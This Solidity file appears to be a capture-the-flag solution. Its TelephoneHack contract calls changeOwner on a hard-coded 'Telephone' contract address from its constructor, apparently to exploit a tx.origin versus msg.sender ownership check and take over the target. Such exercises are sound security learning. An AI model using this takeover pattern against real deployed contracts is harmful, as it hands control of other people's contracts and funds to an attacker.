// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract TelephoneHack {
  Telephone public telephone;
  address public target = 0x7908FD9BdD1ac61f6eD9a09F3EB7818daD631Fcc;
  address public player = 0x7A0c9079609B4014aE75BbCebf47F4589E834818;

  constructor() {
    telephone = Telephone(target);
    telephone.changeOwner(player);
  }
}
